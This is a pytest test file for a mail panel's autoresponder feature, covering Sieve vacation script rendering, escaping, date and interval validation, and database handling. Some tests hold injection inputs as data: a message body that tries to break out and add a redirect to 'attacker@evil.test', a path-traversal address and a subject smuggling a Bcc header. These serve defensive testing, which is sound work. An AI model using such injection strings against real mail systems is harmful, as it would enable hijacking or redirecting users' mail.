"""Autoresponders are applied: a Sieve vacation per mailbox.

The table, API and page existed, but build_state() never sent them and the
helper had no vacation code, so no autoresponder ever answered anything.
"""
import pytest

from mail_fixtures import db, helper_function, load_tool, mail_env, make_domain, make_mailbox, make_user, \
    panel_settings_file  # noqa: F401 - fixtures

tool = load_tool()


# --- the helper's renderer ----------------------------------------------------------

def test_vacation_script_answers_with_subject_body_and_interval():
    script = tool.render_vacation({"address": "info@example.com", "subject": "Out of office",
                                   "body": "Back on Monday.\nRegards", "days": 3})
    assert 'require ["vacation", "date", "relational"];' in script
    assert ':days 3 :addresses ["info@example.com"]' in script
    assert ':subject "Out of office"' in script
    assert '"Back on Monday.\nRegards";' in script
    # Never answers what the spam filter marked.
    assert 'if not header :contains "X-Spam-Status" "Yes" {' in script
    assert "currentdate" not in script


def test_vacation_script_has_its_date_range():
    script = tool.render_vacation({"address": "info@example.com", "subject": "Away", "body": "Away.",
                                   "start": "2026-12-20", "end": "2027-01-04", "days": 1})
    assert 'currentdate :value "ge" "date" "2026-12-20"' in script
    assert 'currentdate :value "le" "date" "2027-01-04"' in script
    assert script.count("allof (") == 1


def test_vacation_text_cannot_break_out_of_its_string():
    body = 'Hi";\nredirect "attacker@evil.test";\n# \\'
    script = tool.render_vacation({"address": "info@example.com", "subject": 'A "quoted" \\ subject',
                                   "body": body, "days": 1})
    assert ':subject "A \\"quoted\\" \\\\ subject"' in script
    assert '"Hi\\";\nredirect \\"attacker@evil.test\\";\n# \\\\";' in script
    # Exactly one action, and it is the vacation.
    assert script.count("vacation :days") == 1
    assert "\nredirect" not in script.replace('\nredirect \\"', "")


@pytest.mark.parametrize("item, message", [
    ({"address": "../x@example.com", "subject": "s", "body": "b"}, "invalid mailbox address"),
    ({"address": "info@example.com", "subject": "a\nBcc: x", "body": "b"}, "subject"),
    ({"address": "info@example.com", "subject": "s", "body": "b\x00"}, "message"),
    ({"address": "info@example.com", "subject": "s", "body": "x" * 9000}, "message"),
    ({"address": "info@example.com", "subject": "s", "body": "b", "start": "2026-13-01"}, "start date"),
    ({"address": "info@example.com", "subject": "s", "body": "b", "start": "2026-05-02", "end": "2026-05-01"},
     "ends before"),
    ({"address": "info@example.com", "subject": "s", "body": "b", "days": 0}, "interval"),
    ({"address": "info@example.com", "subject": "s", "body": "b", "days": True}, "interval"),
])
def test_vacation_input_is_refused(item, message):
    with pytest.raises(tool.ToolError, match=message):
        tool.render_vacation(item)


def test_two_autoresponders_for_one_address_are_refused():
    item = {"address": "info@example.com", "subject": "s", "body": "b"}
    with pytest.raises(tool.ToolError, match="two autoresponders"):
        tool.vacation_scripts([item, dict(item)])
    assert set(tool.vacation_scripts([item])) == {"info@example.com"}


def test_helper_writes_the_vacation_into_the_mailbox_and_dovecot_runs_it():
    sync = helper_function("mail_sync")
    assert "spanel_mailtool.vacation_scripts" in sync
    assert "put_vacation(fds[3], box)" in sync
    assert "O_NOFOLLOW" in sync and "O_EXCL" in sync
    dovecot = helper_function("mail_write_dovecot_conf")
    assert "sieve_before2 = ~/${MAIL_VACATION_SCRIPT}" in dovecot


# --- the panel --------------------------------------------------------------------------

def test_panel_checks_text_and_dates():
    from app.services import mail

    values = mail.normalize_autoresponder(" Away ", "Line 1\r\nLine 2\n\n", "2026-12-20", "2027-01-04", "2")
    assert values == {"subject": "Away", "body": "Line 1\nLine 2", "start_date": "2026-12-20",
                      "end_date": "2027-01-04", "interval_days": 2}
    for args in (("", "b"), ("s", ""), ("s\x07", "b"), ("s", "b", "2026-02-30"), ("s", "b", "2026-02-02", "2026-02-01"),
                 ("s", "b", "", "", 31)):
        with pytest.raises(mail.MailError):
            mail.normalize_autoresponder(*args)


def test_build_state_sends_switched_on_autoresponders_of_mailboxes(db, mail_env):
    from app.models.entities import MailAutoresponder
    from app.services import mail

    owner = make_user(db)
    domain = make_domain(db, owner)
    make_mailbox(db, owner, domain.domain, "info")
    row = mail.create_autoresponder(db, owner, domain.id, "info", "Away", "I am away.", start_date="2026-12-20",
                                    interval_days=2)
    assert row.id and row.enabled
    state = mail_env.states[-1]
    assert state["autoresponders"] == [{"address": "info@example.com", "subject": "Away", "body": "I am away.",
                                        "start": "2026-12-20", "end": "", "days": 2}]
    # What the panel sends, the helper's renderer accepts.
    assert "info@example.com" in tool.vacation_scripts(state["autoresponders"])

    mail.update_autoresponder(db, owner, row.id, "Away", "I am away.", enabled=False)
    assert mail_env.states[-1]["autoresponders"] == []

    # A row left over for an address that is no longer a mailbox is not sent.
    db.add(MailAutoresponder(domain="example.com", local_part="gone", subject="s", body="b", enabled=True))
    db.commit()
    assert all(item["address"] != "gone@example.com" for item in mail.build_state(db)["autoresponders"])


def test_an_autoresponder_needs_a_mailbox(db, mail_env):
    from app.services import mail

    owner = make_user(db)
    domain = make_domain(db, owner)
    with pytest.raises(mail.MailError, match="create the mailbox first"):
        mail.create_autoresponder(db, owner, domain.id, "sales", "Away", "I am away.")


def test_deleting_a_domain_takes_its_autoresponders(db, mail_env, monkeypatch):
    from app.models.entities import MailAutoresponder
    from app.services import mail

    monkeypatch.setattr(mail.shell, "privileged", lambda *a, **k: type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})())
    owner = make_user(db)
    domain = make_domain(db, owner)
    make_mailbox(db, owner, domain.domain, "info")
    mail.create_autoresponder(db, owner, domain.id, "info", "Away", "I am away.")
    mail.delete_domain(db, owner, domain.id)
    assert db.query(MailAutoresponder).count() == 0
